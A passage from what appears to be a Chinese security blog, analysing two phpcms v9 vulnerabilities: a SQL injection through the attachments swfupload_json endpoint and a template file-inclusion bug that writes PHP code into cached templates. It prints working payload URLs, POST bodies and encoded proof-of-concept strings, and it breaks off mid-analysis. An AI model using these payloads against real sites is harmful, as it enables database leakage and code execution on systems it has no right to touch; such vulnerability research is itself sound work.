class="string">'"'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造payload为</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=%*27 and updatexml(1,concat(1,user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=cookie&amp;</span><br></pre></td></tr></table></figure>

<p>在构造payload时不要<code>$i</code>这项,否则将会由于以下代码,payload失效.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $i = $id = intval($i);</span><br></pre></td></tr></table></figure>

<p>为绕过<code>safe_replace()</code>,修改paylaod如下:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=&amp;id=%*27 and updatexml(1,concat(1,user())),1)#&amp;m=1&amp;modelid=1&amp;catid=1&amp;f=cookie&amp;</span><br></pre></td></tr></table></figure>

<p>经过url编码:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id%3d%25*27%20and%20updatexml(1%2cconcat(1%2cuser()))%2c1)%23%26m%3d1%26modelid%3d1%26catid%3d1%26f%3dcookie%26</span><br></pre></td></tr></table></figure>



<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在attachments.php中有这么一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">		<span class="keyword">$this</span>-&gt;userid = $_SESSION[<span class="string">'userid'</span>] ? $_SESSION[<span class="string">'userid'</span>] : (param::get_cookie(<span class="string">'_userid'</span>) ? param::get_cookie(<span class="string">'_userid'</span>) : sys_auth($_POST[<span class="string">'userid_flash'</span>],<span class="string">'DECODE'</span>));</span><br><span class="line">... ... ...</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;userid))&#123;</span><br><span class="line">			showmessage(L(<span class="string">'please_login'</span>,<span class="string">''</span>,<span class="string">'member'</span>));</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要认证,认证是否为管理员用户登录</p>
<p>获得userid_flash的方法</p>
<p>定位<code>./phpcms/modules/wap/index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;		</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db = pc_base::load_model(<span class="string">'content_model'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;siteid = <span class="keyword">isset</span>($_GET[<span class="string">'siteid'</span>]) &amp;&amp; (intval($_GET[<span class="string">'siteid'</span>]) &gt; <span class="number">0</span>) ? intval(trim($_GET[<span class="string">'siteid'</span>])) : (param::get_cookie(<span class="string">'siteid'</span>) ? param::get_cookie(<span class="string">'siteid'</span>) : <span class="number">1</span>);</span><br><span class="line">		param::set_cookie(<span class="string">'siteid'</span>,<span class="keyword">$this</span>-&gt;siteid);	</span><br><span class="line">		<span class="keyword">$this</span>-&gt;wap_site = getcache(<span class="string">'wap_site'</span>,<span class="string">'wap'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;types = getcache(<span class="string">'wap_type'</span>,<span class="string">'wap'</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;wap = <span class="keyword">$this</span>-&gt;wap_site[<span class="keyword">$this</span>-&gt;siteid];</span><br><span class="line">		define(<span class="string">'WAP_SITEURL'</span>, <span class="keyword">$this</span>-&gt;wap[<span class="string">'domain'</span>] ? <span class="keyword">$this</span>-&gt;wap[<span class="string">'domain'</span>].<span class="string">'index.php?'</span> : APP_PATH.<span class="string">'index.php?m=wap&amp;siteid='</span>.<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;wap[<span class="string">'status'</span>]!=<span class="number">1</span>) <span class="keyword">exit</span>(L(<span class="string">'wap_close_status'</span>));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//1.png" alt="1581073053853"></p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>生成密文:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id%3d%25*27+and+updatexml(1%2cconcat(1%2c(user()))%2c1)%23%26m%3d1%26f%3dcookie%26modelid%3d1%26catid%3d1%26</span><br><span class="line"></span><br><span class="line">POST:userid_flash=369b_CwjZql56-b8HtNPMGzWLTEj3sQF4h1VLxYY</span><br></pre></td></tr></table></figure>

<p><img src="/.com//2.png" alt="1581074961288"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=content&amp;c=down&amp;a=init&amp;a_k=<span class="number">6</span>c09EmoZrtqeCKGWcv5iTTkQNeo0bVuMegMOvaPLNZ6SEeyG5sK0TxNum_xlEkgbv6lthq3oE18R3-XpRSPrH7sGkoPxbI1bFePqHtcAMMKV5BpYJq3NE-HNZgT_4xlDmk7mDtHjcg798pB7wQx4i-IPN6mOFQtXIdkxhz1i3KdZViOX0UcU8oNVWDOEmYKLl69Ftjn_HGUw3r5mGa8ikLbbP-rdWhC0QfJMg4sUC9eDJyzuOlZRu7kkEyCzKf<span class="number">-6</span>oF8Che9kYnGOAsWmgxuhkY7uqndWSZQBFKxUkksklkoTtZG7qIv-lUZhNPg25ateNkESCJSZPxHRCCtfArr-_i5lTy5uA0yN9pEr6wtsMs8j_mz9xAd0rur08gw_xUVv6y7AMdzfMUjQhUhr6gDPcgUZWplKDwsZBWKUOV-ROmJS4I9EJ94sstd-KRCiwLe85YrQWvHTJuzzy2ZNFCAkDghc__b-hzy8</span><br></pre></td></tr></table></figure>

<p><img src="/.com//3.png" alt="1581075019899"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/07/phpcmsv9Sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="ck8sqr5jw0013kou5eupj60yd" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-phpcmsv9文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/02/03/phpcmsv9%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2020-02-03T06:09:02.000Z" itemprop="datePublished">2020-02-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/02/03/phpcmsv9%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">phpcmsv9文件包含漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>phpcmsv9文件包含漏洞</p>
<p>很早的漏洞,重新分析一下.</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>路由分析<code>index.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  index.php PHPCMS 入口</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span>			(C) 2005-2010 PHPCMS</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span>				http://www.phpcms.cn/license/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@lastmodify</span>			2010-6-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">//PHPCMS根目录</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'PHPCMS_PATH'</span>, dirname(<span class="keyword">__FILE__</span>).DIRECTORY_SEPARATOR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> PHPCMS_PATH.<span class="string">'/phpcms/base.php'</span>;</span><br><span class="line"></span><br><span class="line">pc_base::creat_app();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>跟进<code>/phpcms/base.php</code>,这是PHPCMS框架入口文件</p>
<p><img src="/.com//1.png" alt="1580710551613"></p>
<p>文件头就定义了<code>IN_PHPCMS</code>为<code>true</code></p>
<p>回到<code>index.php</code>,以下的代码是在调用<code>base.php</code>中的<code>pc_base</code>类的<code>creat_app()</code>函数.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pc_base::creat_app();</span><br></pre></td></tr></table></figure>

<p><img src="/.com//2.png" alt="1580710888328"></p>
<p>分析一下路由,在<code>base.php</code>中分别有三个加载模块所需要调用的方法</p>
<p><img src="/.com//3.png" alt="1580711108427"></p>
<p>这三个都是去调用<code>_load_class</code>函数</p>
<p><img src="/.com//4.png" alt="1580711693698"></p>
<p>分析这个函数</p>
<p>可以明白</p>
<p><code>load_sys_class</code>调用<code>./phpcms/libs/classes</code>的文件</p>
<p><code>load_app_class</code>调用<code>./phpcms/modules/模块名/classes</code>的文件</p>
<p><code>load_model</code>调用<code>./phpcms/model</code>的文件</p>
<p>回过头来再看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">creat_app</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">self</span>::load_sys_class(<span class="string">'application'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后跟进<code>./phpcms/libs/classes/application.class.php</code></p>
<p><img src="/.com//5.png" alt="1580714488524"></p>
<p>然后跟进<code>./phpcms/libs/classes/param.class.php</code>,在<code>application.class.php</code>中分别调用了<code>route_m</code>,<code>route_c</code>,<code>route_a</code></p>
<p><img src="/.com//6.png" alt="1580714785175"></p>
<p>可通过传参来指定调用模型,控制器,事件</p>
<p>然后回到<code>application.class.php</code>,调用函数<code>init()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$controller = <span class="keyword">$this</span>-&gt;load_controller();</span><br><span class="line">	<span class="keyword">if</span> (method_exists($controller, ROUTE_A)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (preg_match(<span class="string">'/^[_]/i'</span>, ROUTE_A)) &#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">'You are visiting the action is to protect the private action'</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			call_user_func(<span class="keyword">array</span>($controller, ROUTE_A));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'Action does not exist.'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后调用<code>load_controller()</code>,加载事件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">load_controller</span><span class="params">($filename = <span class="string">''</span>, $m = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($filename)) $filename = ROUTE_C;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($m)) $m = ROUTE_M;</span><br><span class="line">	$filepath = PC_PATH.<span class="string">'modules'</span>.DIRECTORY_SEPARATOR.$m.DIRECTORY_SEPARATOR.$filename.<span class="string">'.php'</span>;</span><br><span class="line">	<span class="keyword">if</span> (file_exists($filepath)) &#123;</span><br><span class="line">		$classname = $filename;</span><br><span class="line">		<span class="keyword">include</span> $filepath;</span><br><span class="line">		<span class="keyword">if</span> ($mypath = pc_base::my_path($filepath)) &#123;</span><br><span class="line">			$classname = <span class="string">'MY_'</span>.$filename;</span><br><span class="line">			<span class="keyword">include</span> $mypath;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(class_exists($classname))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> $classname;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">'Controller does not exist.'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'Controller does not exist.'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>定位:<code>./phpcms/modules/block/block_admin.php::block_update()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">block_update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) &amp;&amp; intval($_GET[<span class="string">'id'</span>]) ? intval($_GET[<span class="string">'id'</span>]) :  showmessage(L(<span class="string">'illegal_operation'</span>), HTTP_REFERER);</span><br><span class="line">	<span class="comment">//进行权限判断</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;roleid != <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;priv_db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'blockid'</span>=&gt;$id, <span class="string">'roleid'</span>=&gt;<span class="keyword">$this</span>-&gt;roleid, <span class="string">'siteid'</span>=&gt;<span class="keyword">$this</span>-&gt;siteid))) &#123;</span><br><span class="line">			showmessage(L(<span class="string">'not_have_permissions'</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!$data = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id))) &#123;</span><br><span class="line">		showmessage(L(<span class="string">'nofound'</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">		$sql = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">if</span> ($data[<span class="string">'type'</span>] == <span class="number">2</span>) &#123;</span><br><span class="line">			$title = <span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) ? $_POST[<span class="string">'title'</span>] : <span class="string">''</span>;</span><br><span class="line">			$url = <span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) ? $_POST[<span class="string">'url'</span>] : <span class="string">''</span>;</span><br><span class="line">			$thumb = <span class="keyword">isset</span>($_POST[<span class="string">'thumb'</span>]) ? $_POST[<span class="string">'thumb'</span>] : <span class="string">''</span>;</span><br><span class="line">			$desc = <span class="keyword">isset</span>($_POST[<span class="string">'desc'</span>]) ? $_POST[<span class="string">'desc'</span>] : <span class="string">''</span>;</span><br><span class="line">			$template = <span class="keyword">isset</span>($_POST[<span class="string">'template'</span>]) &amp;&amp; trim($_POST[<span class="string">'template'</span>]) ? trim($_POST[<span class="string">'template'</span>]) : <span class="string">''</span>;</span><br><span class="line">			$datas = <span class="keyword">array</span>();</span><br><span class="line">			<span class="keyword">foreach</span> ($title <span class="keyword">as</span> $key=&gt;$v) &#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">empty</span>($v) || !<span class="keyword">isset</span>($url[$key]) ||<span class="keyword">empty</span>($url[$key])) <span class="keyword">continue</span>;</span><br><span class="line">				$datas[$key] = <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$v, <span class="string">'url'</span>=&gt;$url[$key], <span class="string">'thumb'</span>=&gt;$thumb[$key], <span class="string">'desc'</span>=&gt;str_replace(<span class="keyword">array</span>(chr(<span class="number">13</span>), chr(<span class="number">43</span>)), <span class="keyword">array</span>(<span class="string">'&lt;br /&gt;'</span>, <span class="string">'&amp;nbsp;'</span>), $desc[$key]));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> ($template) &#123;</span><br><span class="line">				$block = pc_base::load_app_class(<span class="string">'block_tag'</span>);</span><br><span class="line">				$block-&gt;template_url($id, $template);</span><br><span class="line">			&#125;</span><br><span class="line">               .....</span><br><span class="line">                   ....</span><br><span class="line">                   ......</span><br></pre></td></tr></table></figure>

<p>关键代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($template) &#123;</span><br><span class="line">	$block = pc_base::load_app_class(<span class="string">'block_tag'</span>);</span><br><span class="line">	$block-&gt;template_url($id, $template);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用了<code>template_url</code>()</p>
<p>跟进至<code>./phpcms/modules/block/classes/block_tag.class.php::template_url()</code></p>
<p><img src="/.com//7.png" alt="1580717922585"></p>
<p>对照<code>template_url()</code>的内容,回到<code>block_update()</code>.其中<code>$template</code>和<code>$id</code>都是我们能控制的.然后这里调用了<code>teemplate_cache.class.php</code>的<code>template_parse()</code></p>
<p><img src="/.com//9.png" alt="1580718778371"></p>
<p>这里其实不严谨,令payload为<code>{php phpinfo();}</code>就可以绕过</p>
<p>最有意思的一点来了,<code>block_update()</code>在逻辑上是一段更新数据用的代码</p>
<p>所以这个数据首先得存在才可以</p>
<p>那么我们先看<code>block_admin.php</code>的<code>add()</code></p>
<p><img src="/.com//8.png" alt="1580718565532"></p>
<p>然后构造payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)添加一个数据,添加后如数据库所示</span><br><span class="line">payload:</span><br><span class="line">?m=block&amp;c=block_admin&amp;a=add&amp;pos=<span class="number">1</span>&amp;pc_hash=pI9K4g</span><br><span class="line">POST:dosubmit=<span class="number">1</span>&amp;name=test&amp;type=<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">(<span class="number">2</span>)更新数据,更新后的结果如下图</span><br><span class="line">payload</span><br><span class="line">?m=block&amp;c=block_admin&amp;a=block_update&amp;id=<span class="number">2</span>&amp;pc_hash=pI9K4g</span><br><span class="line">POST:dosubmit=<span class="number">1</span>&amp;template=&#123;php phpinfo();&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//10.png" alt="1580720665955"></p>
<p><img src="/.com//11.png" alt="1580720939249"></p>
<p>文件已经写入</p>
<p><img src="/.com//12.png" alt="1580721206741"></p>
<p>接着就是如何读取文件,如果像平时那样直接根据路径会读文件,会因为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> defined(<span class="string">'IN_PHPCMS'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">'No permission resources.'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>而无法读取,但是如果在后台有登录的情况下,由于在base.php中的如下代码,</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'IN_PHPCMS'</span>, <span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>

<p>则可以通过构造payload读取木马文件.</p>
<p><code>/phpcms/modules/block/classes/block_tag.class.php:pc_tag()</code></p>
<p><img src="/.com//13.png" alt="1580721499533"></p>
<p>其中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="keyword">$this</span>-&gt;template_url($id);</span><br></pre></td></tr></table></figure>

<p>将会根据id去读取<code>/phpcms/caches/caches_template/block</code>里的文件.</p>
<p>然后这时候看到<code>./phpcms/modules/link/index.php::register()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		$siteid = SITEID;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>]))&#123;</span><br><span class="line">			<span class="keyword">if</span>($_POST[<span class="string">'name'</span>]==<span class="string">""</span>)&#123;</span><br><span class="line">				showmessage(L(<span class="string">'sitename_noempty'</span>),<span class="string">"?m=link&amp;c=index&amp;a=register&amp;siteid=$siteid"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>($_POST[<span class="string">'url'</span>]==<span class="string">""</span> || !preg_match(<span class="string">'/^http:\/\/(.*)/i'</span>, $_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">				showmessage(L(<span class="string">'siteurl_not_empty'</span>),<span class="string">"?m=link&amp;c=index&amp;a=register&amp;siteid=$siteid"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(!in_array($_POST[<span class="string">'linktype'</span>],<span class="keyword">array</span>(<span class="string">'0'</span>,<span class="string">'1'</span>)))&#123;</span><br><span class="line">				$_POST[<span class="string">'linktype'</span>] = <span class="string">'0'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$link_db = pc_base::load_model(link_model);</span><br><span class="line">			$_POST[<span class="string">'logo'</span>] =new_html_special_chars($_POST[<span class="string">'logo'</span>]);</span><br><span class="line"></span><br><span class="line">		$logo = safe_replace(strip_tags($_POST[<span class="string">'logo'</span>]));</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/^http:\/\/(.*)/i'</span>, $logo))&#123;</span><br><span class="line">			$logo = <span class="string">''</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$name = safe_replace(strip_tags($_POST[<span class="string">'name'</span>]));</span><br><span class="line">		$url = safe_replace(strip_tags($_POST[<span class="string">'url'</span>]));</span><br><span class="line">		$url = trim_script($url);</span><br><span class="line">			<span class="keyword">if</span>($_POST[<span class="string">'linktype'</span>]==<span class="string">'0'</span>)&#123;</span><br><span class="line">				$sql = <span class="keyword">array</span>(<span class="string">'siteid'</span>=&gt;$siteid,<span class="string">'typeid'</span>=&gt;intval($_POST[<span class="string">'typeid'</span>]),<span class="string">'linktype'</span>=&gt;intval($_POST[<span class="string">'linktype'</span>]),<span class="string">'name'</span>=&gt;$name,<span class="string">'url'</span>=&gt;$url);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				$sql = <span class="keyword">array</span>(<span class="string">'siteid'</span>=&gt;$siteid,<span class="string">'typeid'</span>=&gt;intval($_POST[<span class="string">'typeid'</span>]),<span class="string">'linktype'</span>=&gt;intval($_POST[<span class="string">'linktype'</span>]),<span class="string">'name'</span>=&gt;$name,<span class="string">'url'</span>=&gt;$url,<span class="string">'logo'</span>=&gt;$logo);</span><br><span class="line">			&#125;</span><br><span class="line">			$link_db-&gt;insert($sql);</span><br><span class="line">			showmessage(L(<span class="string">'add_success'</span>), <span class="string">"?m=link&amp;c=index&amp;siteid=$siteid"</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> 			$setting = getcache(<span class="string">'link'</span>, <span class="string">'commons'</span>);</span><br><span class="line">		$setting = $setting[$siteid];</span><br><span class="line">			<span class="keyword">if</span>($setting[<span class="string">'is_post'</span>]==<span class="string">'0'</span>)&#123;</span><br><span class="line">				showmessage(L(<span class="string">'suspend_application'</span>), HTTP_REFERER);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;type = pc_base::load_model(<span class="string">'type_model'</span>);</span><br><span class="line">			$types = <span class="keyword">$this</span>-&gt;type-&gt;get_types($siteid);<span class="comment">//获取站点下所有友情链接分类</span></span><br><span class="line">			pc_base::load_sys_class(<span class="string">'form'</span>, <span class="string">''</span>, <span class="number">0</span>);</span><br><span class="line"> 			$SEO = seo(SITEID, <span class="string">''</span>, L(<span class="string">'application_links'</span>), <span class="string">''</span>, <span class="string">''</span>);</span><br><span class="line">  			<span class="keyword">include</span> template(<span class="string">'link'</span>, <span class="string">'register'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中最关键是</p>
